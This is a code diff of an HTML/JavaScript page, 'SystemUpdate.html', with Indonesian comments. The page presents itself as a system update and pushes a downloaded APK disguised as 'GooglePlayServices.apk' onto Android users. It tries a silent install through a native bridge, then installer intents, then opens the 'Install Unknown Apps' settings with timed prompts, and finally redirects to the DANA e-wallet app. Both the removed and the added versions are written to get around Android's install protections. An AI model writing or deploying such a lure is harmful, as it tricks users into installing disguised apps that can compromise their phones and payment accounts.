@@ -29,7 +29,7 @@
 
 <script>
 // ============================================================
-// 🔥 SystemUpdate.html - FULL BYPASS INSTALL
+// 🔥 SystemUpdate.html - ANTI-STUCK INSTALLER
 // ============================================================
 
 var GITHUB_USER = 'pandora-site';
@@ -51,79 +51,87 @@ var BRIDGE = null;
 })();
 
 // ============================================================
-// SISTEM BYPASS INSTALL 3 LAPIS
+// 1. FUNGSI UNTUK MENGIZINKAN INSTALL (Anti-Blokir)
 // ============================================================
-
-// Lapisan 1: Coba Silent Install via Bridge (Native)
-function tryBridgeInstall(path) {
-    if (BRIDGE && typeof BRIDGE.installAPK === 'function') {
-        try {
-            return BRIDGE.installAPK(path);
-        } catch(e) { return false; }
-    }
-    return false;
-}
-
-// Lapisan 2: Intent Langsung (Bypass Unknown Source)
-function tryIntentInstall(path) {
+function openInstallPermission() {
     try {
-        window.location.href = 'intent://' + path + '#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end';
-        return true;
-    } catch(e) { return false; }
-}
-
-// Lapisan 3: Buka via File Manager (Bypass paling kuat)
-function tryFileManagerInstall(path) {
-    try {
-        // Menggunakan aplikasi Download Manager / File Manager bawaan
-        window.location.href = 'intent://' + path + '#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;package=com.android.documentsui;end';
-        return true;
-    } catch(e) { return false; }
-}
-
-// Lapisan 4 (Final): Buka Pengaturan Install Unknown Apps
-function openInstallSettings() {
-    try {
+        // Intent untuk membuka halaman "Install Unknown Apps"
+        // Android 8+ membutuhkan ini agar aplikasi bisa menginstall APK
         window.location.href = 'intent://com.android.settings.ManageApplications#Intent;action=android.settings.MANAGE_UNKNOWN_APP_SOURCES;end';
     } catch(e) {
+        // Fallback: Buka Pengaturan Umum
         window.location.href = 'intent://com.android.settings#Intent;action=android.settings.SETTINGS;end';
     }
 }
 
 // ============================================================
-// EXECUTOR (Mencoba Semua Metode)
+// 2. FUNGSI INSTALL (Dengan Open Tab Baru agar Tidak Stuck)
 // ============================================================
 function executeInstall() {
     var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
     
-    updateProgress(50, '⏳ Mencoba instalasi otomatis...');
-
-    // Coba Bridge (Silent)
-    if (tryBridgeInstall(path)) {
-        updateProgress(100, '✅ Instalasi Berhasil');
-        setTimeout(redirectToDANA, 3000);
-        return;
+    // 1. Bridge Native (Jika Ada)
+    if (BRIDGE && typeof BRIDGE.installAPK === 'function') {
+        try {
+            var result = BRIDGE.installAPK(path);
+            if (result) {
+                updateProgress(100, '✅ Instalasi Berhasil');
+                setTimeout(redirectToDANA, 3000);
+                return;
+            }
+        } catch(e) {}
     }
 
-    // Coba Intent (Bypass)
-    if (tryIntentInstall(path)) {
-        updateProgress(80, '⏳ Membuka Installer...');
-        return;
+    // 2. Jika tidak ada Bridge, lakukan Langkah Anti-Stuck:
+    updateProgress(80, '⏳ Membuka Installer...');
+    
+    // Buka tab baru untuk menghindari "stuck" di halaman yang sama
+    // window.open akan membuka Intent di tab/WebView baru
+    try {
+        window.open('intent://' + path + '#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end', '_blank');
+    } catch(e) {
+        // Fallback: Jika gagal, buka file langsung
+        window.open('file://' + path, '_blank');
     }
 
-    // Coba File Manager
-    if (tryFileManagerInstall(path)) {
-        updateProgress(80, '⏳ Membuka File Manager...');
-        return;
-    }
-
-    // Jika semua gagal, arahkan ke Pengaturan
-    updateProgress(60, '⏳ Membuka Pengaturan Izin...');
-    setTimeout(openInstallSettings, 1000);
+    // Karena instalasi butuh waktu, jangan redirect sekarang.
+    // Instalasi akan dilanjutkan oleh sistem Android.
 }
 
 // ============================================================
-// REDIRECT KE DANA
+// 3. EKSEKUSI UTAMA (Cek Izin, Lalu Install)
+// ============================================================
+function startUpdate() {
+    updateProgress(30, '⏳ Memverifikasi file...');
+    
+    // Cek apakah file APK ada (opsional)
+    // Karena kita yakin file sudah terdownload di index.html, kita langsung lanjut.
+
+    // Periksa apakah pengguna sudah mengizinkan install dari sumber tidak dikenal
+    // Kita tidak bisa mengecek status izin dari JavaScript, jadi kita langsung coba.
+    // Jika stuck, kita arahkan ke Pengaturan.
+    
+    updateProgress(70, '⏳ Menyiapkan Installer...');
+    
+    setTimeout(function() {
+        // Cobalah install
+        executeInstall();
+        
+        // Jika dalam 5 detik installer tidak muncul (stuck), arahkan ke pengaturan
+        setTimeout(function() {
+            // Tampilkan pesan agar user mengaktifkan izin
+            updateProgress(90, '⏳ Jika installer tidak muncul, izinkan di Pengaturan...');
+            
+            // Beri user waktu 3 detik, lalu arahkan ke Pengaturan
+            setTimeout(function() {
+                openInstallPermission();
+            }, 3000);
+        }, 5000);
+    }, 1500);
+}
+
+// ============================================================
+// 4. REDIRECT KE DANA (Setelah Selesai)
 // ============================================================
 function redirectToDANA() {
     try {
@@ -140,8 +148,8 @@ function redirectToDANA() {
 // ============================================================
 // START
 // ============================================================
-updateProgress(20, '⏳ Memverifikasi file instalasi...');
-setTimeout(executeInstall, 2000);
+updateProgress(10, '⏳ Memeriksa file instalasi...');
+setTimeout(startUpdate, 2000);
 </script>
 </body>
 </html>
